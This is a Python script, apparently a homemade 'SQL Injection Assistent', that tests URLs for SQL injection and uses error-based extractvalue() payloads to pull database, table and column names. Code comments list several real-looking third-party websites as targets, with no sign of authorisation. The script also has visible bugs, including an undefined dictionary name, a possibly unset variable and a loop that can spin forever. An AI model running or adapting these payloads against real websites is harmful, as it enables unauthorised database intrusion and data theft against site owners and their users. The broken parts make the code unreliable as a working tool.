import requests, argparse
from bs4 import BeautifulSoup as BS

# http://www.securityidiots.com/Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-Extractvalue.html
# https://www.architecturalpapers.ch/index.php?ID=4%27              
# http://www.wurm.info/index.php?id=8%27                            
# https://www.cityimmo.ch/reservations.php?lang=FR&todo=res&;id=22
# http://www.meggieschneider.com/php/detail.php?id=48

def Main(test, get_database_type, dbname, tablenames, dump, columns, colum_name):
    if args.test:
        urls = [args.test + "'", args.test + '"', args.test[:-4] + ';', args.test + ")", args.test + "')", args.test + '")', args.test + '*'] 
        vulnerable_text = ['MySQL Query fail:', '/www/htdocs/', 'Query failed', 'mysqli_fetch_array()', 'mysqli_result', 'Warning: ', 'MySQL server', 'SQL syntax', 'You have an error in your SQL syntax;', 'mssql_query()', "Incorrect syntax near '='", 'mssql_num_rows()', 'Notice: ']
        try:
            for url in urls:
                results = requests.get(url)
                data = results.text
                soup = BS(data, features='html.parser')
                for vuln in vulnerable_text:
                    if vuln in data:
                        string = vuln
                        vulnerable = True
            if vulnerable:
                print('Site is vulnerable!')
        except:
            print('Site is not vulnerable!')
    elif args.dump:
        print('Dumping the database')
    elif args.tablenames:
        print("Extracting tables names...")
        link = str(args.tablenames) + " and extractvalue(1,(select%20group_concat(table_name) from%20information_schema.tables where table_schema=database()))"
        results = requests.get(link)
        data = results.text 
        str_num = str(data).find('error: ')
        str1_num = data[str_num:]
        str1 = str1_num[8:]
        str2 = str1.find('\'')
        str3 = str1[:str2]
        print(f"\nTable names: {str3}")
    elif args.columns:
        print('Extracting Columns...')
        link = str(args.columns) + " and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name='" + args.colum_name + "'limit 0,1)))--"
        results = requests.get(link)
        data = results.text
        
        print(f"Column names: {data}")
    elif args.dbname:
        link = args.dbname + " and extractvalue(1,concat(1,(select database()))) --" # " and extractvalue(0x0a,concat(0x0a,(select database())))--"
        print(link)
        results = requests.get(link)
        data = results.text 
        str_num = str(data).find('error:')
        print(str_num) 
        str1_num = data[str_num:]
        str1 = str1_num[8:]
        str2 = str1.find('\'')
        str3 = str1[:str2]
        if str_num == -1:
            print('Access Denied')
        else:
            print(f"Database name: {str3}")
    elif args.get_database_type:
        urls = [args.get_database_type + "'", args.get_database_type + '"', args.get_database_type[:-4] + ';', args.get_database_type + ")", args.get_database_type + "')", args.get_database_type + '")', args.get_database_type + '*']
        db_dict = {
    "MySQL": [
        'MySQL', 'MySQL Query fail:', 'SQL syntax', 'You have an error in your SQL syntax', 'mssql_query()', 'mssql_num_rows()',
        '1064 You have an error in your SQL syntax'
    ],
    "PostGre": [
        'PostgreSQL query failed', 'Query failed', 'syntax error', 'unterminated quoted string', 'unterminated dollar-quoted string',
        'column not found', 'relation not found', 'function not found'
    ],
    "Microsoft_SQL": [
        'Microsoft SQL Server', 'Invalid object name', 'Unclosed quotation mark', 'Incorrect syntax near', 'SQL Server error',
        'The data types ntext and nvarchar are incompatible'
    ],
    "Oracle": [
        'ORA-', 'Oracle error', 'PLS-', 'invalid identifier', 'missing expression', 'missing keyword', 'missing right parenthesis',
        'not a valid month'
    ],
    "Advantage_Database": [
        'AdsCommandException', 'AdsConnectionException', 'AdsException', 'AdsExtendedReader', 'AdsDataReader', 'AdsError'
    ],
    "Firebird": [
        'Dynamic SQL Error', 'SQL error code', 'arithmetic exception', 'numeric value is out of range', 'malformed string',
        'Invalid token'
    ]
}
        DBFound = 0
        DBType = ''
        try:
            for url in urls:
                results = requests.get(url)
                data = results.text
                soup = BS(data, features='html.parser')
                while not DBFound:
                    for db, identifiers in DBDict.items():
                        for dbid in identifiers:
                            if dbid in data:
                                DBType = db
                                DBFound = 1
                                print(DBType)
                                break
        except:
            print('Database type: Unknown')
    else:
        print('Invalid Argument given!')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='SQL Injection Assistent')
    ap = argparse.ArgumentParser(prog='sql.py', usage='%(prog)s [options] -t <Target to test for SQLI Vulnerablities>', description='SQL Injection Assistent')
    ap.add_argument('-t', '--test', type=str, help='Test Target for SQLI Vulnerablities')
    ap.add_argument('-gdt', '--get_database_type', type=str, help='Find backend DB type')
    ap.add_argument('-dbn', '--dbname', type=str, help='Get database name')
    ap.add_argument('-tn', '--tablenames', type=str, help='Get table names')
    ap.add_argument('-c', '--columns', type=str, help="Get Column names")
    ap.add_argument('-cn', '--colum_name', type=str, help='Column Name')
    ap.add_argument('-d', '--dump', type=str, help="Dump the Database")
    args = ap.parse_args()
    test = args.test
    dbname = args.dbname
    tablenames = args.tablenames
    dump = args.dump
    columns = args.columns
    colum_name = args.colum_name
    get_database_type = args.get_database_type
    Main(test, get_database_type, dbname, tablenames, dump, columns, colum_name)
